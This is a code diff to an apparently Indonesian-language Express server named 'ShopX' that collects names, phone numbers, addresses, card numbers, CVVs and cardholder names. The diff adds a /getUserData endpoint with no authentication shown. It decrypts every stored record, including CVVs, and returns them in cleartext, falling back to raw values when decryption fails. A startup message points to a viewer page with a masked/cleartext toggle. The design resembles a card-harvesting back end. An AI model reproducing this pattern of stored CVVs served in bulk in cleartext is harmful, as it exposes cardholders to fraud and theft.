@@ -53,8 +53,6 @@ db.connect((err) => {
   });
 });
 
-// Koneksi database sudah ditangani di atas
-
 // Endpoint menerima data dari frontend
 app.post('/submit', (req, res) => {
   const { nama, telepon, alamat, kartu, cvv, pemilik } = req.body;
@@ -140,10 +138,72 @@ app.get('/getData', (req, res) => {
       return res.status(500).json({ message: 'Gagal mendekripsi data.', error: error.message });
     }
   });
+});
 
+// Endpoint baru untuk mengambil data pengguna dengan toggle masked/cleartext
+app.get('/getUserData', (req, res) => {
+  console.log('Request untuk mengambil data pengguna diterima');
+
+  const query = 'SELECT * FROM pengguna ORDER BY timestamp DESC';
+  db.query(query, (err, results) => {
+    if (err) {
+      console.error('Gagal mengambil data pengguna:', err);
+      return res.status(500).json({ message: 'Gagal mengambil data pengguna.', error: err.message });
+    }
+    
+    try {
+      // Dekripsi data sensitif untuk setiap hasil
+      const decryptedResults = results.map(item => {
+        try {
+          // Cek apakah data sudah dalam format JSON atau belum
+          let alamatDecrypted, kartuDecrypted, cvvDecrypted, pemilikDecrypted;
+          
+          try {
+            // Coba parse sebagai JSON
+            const alamatEncrypted = JSON.parse(item.alamat);
+            const kartuEncrypted = JSON.parse(item.kartu);
+            const cvvEncrypted = JSON.parse(item.cvv);
+            const pemilikEncrypted = JSON.parse(item.pemilik);
+            
+            // Dekripsi data jika berhasil di-parse
+            alamatDecrypted = cryptoService.decrypt(alamatEncrypted);
+            kartuDecrypted = cryptoService.decrypt(kartuEncrypted);
+            cvvDecrypted = cryptoService.decrypt(cvvEncrypted);
+            pemilikDecrypted = cryptoService.decrypt(pemilikEncrypted);
+          } catch (parseError) {
+            // Jika gagal parse, gunakan data asli (mungkin belum terenkripsi)
+            console.log('Data mungkin belum terenkripsi, menggunakan data asli');
+            alamatDecrypted = item.alamat;
+            kartuDecrypted = item.kartu;
+            cvvDecrypted = item.cvv;
+            pemilikDecrypted = item.pemilik;
+          }
+          
+          return {
+            ...item,
+            alamat: alamatDecrypted,
+            kartu: kartuDecrypted,
+            cvv: cvvDecrypted,
+            pemilik: pemilikDecrypted
+          };
+        } catch (decryptError) {
+          console.error('Gagal memproses item:', decryptError);
+          // Kembalikan data asli jika dekripsi gagal
+          return item;
+        }
+      });
+      
+      console.log('Data pengguna berhasil diambil dan diproses');
+      res.json({ data: decryptedResults });
+    } catch (error) {
+      console.error('Error saat memproses data pengguna:', error);
+      return res.status(500).json({ message: 'Gagal memproses data pengguna.', error: error.message });
+    }
+  });
 });
 
 // Start server
 app.listen(PORT, () => {
   console.log(`Server ShopX berjalan di http://localhost:${PORT}`);
+  console.log(`Akses tampilan data dengan toggle di http://localhost:${PORT}/data_view.html`);
 });
